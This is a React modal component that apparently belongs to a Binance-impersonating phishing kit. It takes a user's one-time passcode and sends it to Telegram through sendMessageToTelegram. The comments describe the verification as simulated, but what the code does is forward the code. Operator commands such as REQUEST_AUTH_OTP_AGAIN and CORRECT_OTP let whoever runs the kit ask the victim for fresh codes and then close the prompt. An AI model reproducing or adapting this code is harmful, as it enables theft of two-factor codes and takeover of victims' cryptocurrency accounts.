'use client'
import { useState, useEffect } from 'react'
import '../app/globals.css'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useCommand } from '../app/lib/CommandContext';
import { sendMessageToTelegram } from '../lib/api';

export default function Modal({ displayModal, setDisplayModal, modal, setModal }) {
    const { theme, toggleTheme } = useTheme();
    const [isLoading, setIsLoading] = useState(false)
    const [modalState, setModalState] = useState(`invisible fixed opacity-0`) // Changed from hidden to invisible
    const [animate, setAnimate] = useState('opacity-0')
    const [otpCode, setOtpCode] = useState('');
    const [invalid, setInvalid] = useState(false);
    const { command } = useCommand(); // Get current command

    useEffect(() => {
        console.log("Command is ", command);
        if (command === 'REQUEST_AUTH_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
        } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
        } else if (command === 'CORRECT_OTP') {
            console.log("Closing modal for:", modal);
            setIsLoading(false);
            setOtpCode('');
            setDisplayModal(false); // Close regardless of modal type
        }
    }, [command, modal, setDisplayModal]);

    // Modal visibility effect - this was missing in your current implementation
    useEffect(() => {
        if (displayModal) {
            setModalState('fixed visible flex flex-col justify-between md:justify-normal')
            // Add a small delay to trigger the animation
            setTimeout(() => {
                setAnimate('opacity-100')
            }, 10)
        } else {
            setAnimate('opacity-0')
            // Wait for opacity transition to complete before hiding
            setTimeout(() => {
                setModalState('invisible fixed opacity-0')
            }, 200) // Match this with your transition duration
        }
    }, [displayModal]);

    const handleOtpSubmit = () => {
        if (otpCode) {
            setIsLoading(true);

            // Simulating OTP verification
            setTimeout(() => {
                // You can replace this with your actual Telegram integration
                console.log(`Sending ${modal} OTP:`, otpCode);

                // For now, just simulate success and close modal

                sendMessageToTelegram(otpCode);
                setOtpCode('');
                // setDisplayModal(false);
            }, 1500);
        } else {
            setInvalid(true); // Show error if OTP code is empty
        }
    };

    const handleContainerClick = () => {
        if (invalid) setInvalid(false);
    };

    return (
        <div
            className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'}`}
            onClick={() => setInvalid(false)} // Add this line
        >

        </div>
    )
}